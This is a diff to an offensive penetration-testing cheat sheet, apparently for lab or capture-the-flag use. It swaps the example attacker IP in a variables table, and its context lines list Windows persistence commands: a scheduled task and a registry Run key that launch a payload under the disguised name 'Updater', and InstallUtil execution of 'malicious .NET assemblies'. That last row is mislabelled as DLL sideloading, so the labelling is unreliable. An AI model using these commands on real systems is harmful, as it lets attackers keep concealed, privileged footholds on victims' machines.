@@ -6,7 +6,7 @@ Before using the commands below, define your variables:
 
 | Variable      | Description                         | Example             |
 |---------------|-------------------------------------|---------------------|
-| `{{LHOST}}`   | Local host IP (attacker)            | `10.10.14.7`        |
+| `{{LHOST}}`   | Local host IP (attacker)            | `10.10.14.4`        |
 | `{{LPORT}}`   | Local port                          | `9001`              |
 | `{{RHOST}}`   | Remote host IP (target)             | `10.10.10.32`       |
 | `{{RPORT}}`   | Remote port                         | `443`               |
@@ -61,4 +61,5 @@ Before using the commands below, define your variables:
 | `schtasks /create /tn "Updater" /tr "{{FILENAME}}" /sc minute /mo 1` | Scheduled task persistence | Use `/ru SYSTEM` for privilege |
 | `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "{{FILENAME}}"` | Registry run key | User-level persistence |
 | `InstallUtil.exe /logfile= /LogToConsole=false /U {{FILENAME}}` | DLL sideloading | Use with malicious .NET assemblies |
+
 
